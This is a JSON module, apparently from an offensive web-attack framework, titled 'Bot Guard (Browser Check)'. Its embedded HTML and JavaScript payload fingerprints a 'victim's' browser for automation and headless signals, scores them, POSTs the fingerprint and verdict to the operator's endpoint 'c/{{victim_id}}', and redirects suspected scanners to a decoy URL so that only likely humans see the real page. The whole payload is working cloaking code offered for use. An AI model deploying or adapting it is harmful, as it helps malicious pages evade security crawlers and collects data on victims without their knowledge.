{
  "name": "Bot Guard (Browser Check)",
  "description": "Probes the victim's browser for automation and headless signals (webdriver flag, phantom/nightmare globals, plugin count, languages, screen/window metrics, touch support, WebGL renderer, hardware profile), scores them, and reports the verdict to the operator. Likely-human visitors are shown the page; likely bots can be redirected to a decoy URL. Fails open (reveals the page) on any error. Inputs are embedded via hidden DOM elements, so quotes and apostrophes are safe; avoid HTML special characters (<, &) in inputs.",
  "category": "Anti-Bot",
  "icon": "",
  "inputs": [
    {
      "id": 0,
      "label": "Decoy URL (redirect if bot detected)",
      "type": "string",
      "required": false
    },
    {
      "id": 1,
      "label": "Challenge Timeout (seconds)",
      "type": "number",
      "required": false
    }
  ],
  "payload": "<div class=\"bg-root\"><div class=\"bg-box\"><div class=\"bg-spinner\"></div><h2 class=\"bg-title\">Verifying your browser…</h2><p class=\"bg-subtitle\">Please wait while we make sure you are not a bot.</p></div><span id=\"bgDecoy\" hidden>{{ params[0] }}</span><span id=\"bgTimeout\" hidden>{{ params[1] }}</span></div><script>(function(){var decoyEl=document.getElementById('bgDecoy');var timeoutEl=document.getElementById('bgTimeout');var decoy=decoyEl?decoyEl.textContent.trim():'';var timeoutSec=parseInt(timeoutEl?timeoutEl.textContent:'',10)||10;var moduleId='{{module_id}}';var revealed=false;function reveal(){if(revealed)return;revealed=true;try{__removeModule();}catch(e){}}var hardTimer=setTimeout(reveal,timeoutSec*1000);function collectSignals(){var s={};try{s.webdriver=!!navigator.webdriver;}catch(e){s.webdriver=null;}try{s.hasChrome=!!window.chrome;}catch(e){s.hasChrome=null;}try{s.plugins=navigator.plugins?navigator.plugins.length:-1;}catch(e){s.plugins=-1;}try{s.languages=navigator.languages?navigator.languages.join(','):(navigator.language||'');}catch(e){s.languages='';}try{s.screenWidth=screen.width||0;s.screenHeight=screen.height||0;}catch(e){s.screenWidth=0;s.screenHeight=0;}try{s.outerWidth=window.outerWidth||0;s.outerHeight=window.outerHeight||0;s.innerWidth=window.innerWidth||0;s.innerHeight=window.innerHeight||0;}catch(e){s.outerWidth=0;s.outerHeight=0;s.innerWidth=0;s.innerHeight=0;}try{s.touchSupport=('ontouchstart' in window)||(navigator.maxTouchPoints||0)>0;s.maxTouchPoints=navigator.maxTouchPoints||0;}catch(e){s.touchSupport=null;s.maxTouchPoints=0;}try{s.hardwareConcurrency=navigator.hardwareConcurrency||0;}catch(e){s.hardwareConcurrency=0;}try{s.deviceMemory=navigator.deviceMemory||0;}catch(e){s.deviceMemory=0;}try{s.userAgent=navigator.userAgent||'';}catch(e){s.userAgent='';}try{s.phantom=!!(window.phantom||window._phantom);s.nightmare=!!window.__nightmare;s.domAutomation=!!(window.domAutomation||window.domAutomationController);}catch(e){s.phantom=false;s.nightmare=false;s.domAutomation=false;}s.webglRenderer=null;try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){var ext=gl.getExtension('WEBGL_debug_renderer_info');s.webglRenderer=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);}}catch(e){s.webglRenderer=null;}return s;}function evaluate(s){var ua=(s.userAgent||'').toLowerCase();if(ua.indexOf('headlesschrome')!==-1||s.webdriver===true){return{score:100,verdict:'bot'};}var pts=0;if(s.phantom||s.nightmare)pts+=40;if(s.domAutomation)pts+=30;if(s.plugins===0&&ua.indexOf('chrome')!==-1)pts+=15;if(s.outerWidth===0||s.outerHeight===0)pts+=10;else if(s.innerWidth&&s.outerWidth<s.innerWidth)pts+=5;if(!s.webglRenderer)pts+=15;if(s.screenWidth===0||s.screenHeight===0)pts+=10;if(s.touchSupport===false&&/android|iphone|ipad|mobile/.test(ua))pts+=10;if(!s.hardwareConcurrency)pts+=5;var verdict=pts>=50?'bot':(pts>=20?'inconclusive':'human');return{score:pts,verdict:verdict};}function finish(verdict){clearTimeout(hardTimer);if(verdict==='bot'&&decoy){try{window.location.href=decoy;}catch(e){reveal();}return;}reveal();}try{var signals=collectSignals();var result=evaluate(signals);var body=JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{verdict:result.verdict,score:result.score,signals:signals,url:window.location.href,timestamp:new Date().toISOString()}});fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:body}).then(function(){finish(result.verdict);},function(){finish(result.verdict);});}catch(e){finish('inconclusive');}})();</script><style>.bg-root{position:fixed;inset:0;z-index:2147483647;background:#f8f9fb;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif}.bg-box{background:#fff;border-radius:12px;padding:40px 44px;max-width:400px;width:90%;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.12);animation:bgPop .3s ease-out}.bg-spinner{width:44px;height:44px;margin:0 auto 22px;border:4px solid #e4e7f0;border-top-color:#667eea;border-radius:50%;animation:bgSpin .8s linear infinite}.bg-title{color:#2d2d2d;margin:0 0 8px;font-size:20px;font-weight:600}.bg-subtitle{color:#6b6b6b;margin:0;font-size:14px;line-height:1.5}@keyframes bgSpin{to{transform:rotate(360deg)}}@keyframes bgPop{from{opacity:0;transform:scale(.92) translateY(8px)}to{opacity:1;transform:scale(1) translateY(0)}}</style>",
  "link": "c/{{victim_id}}"
}
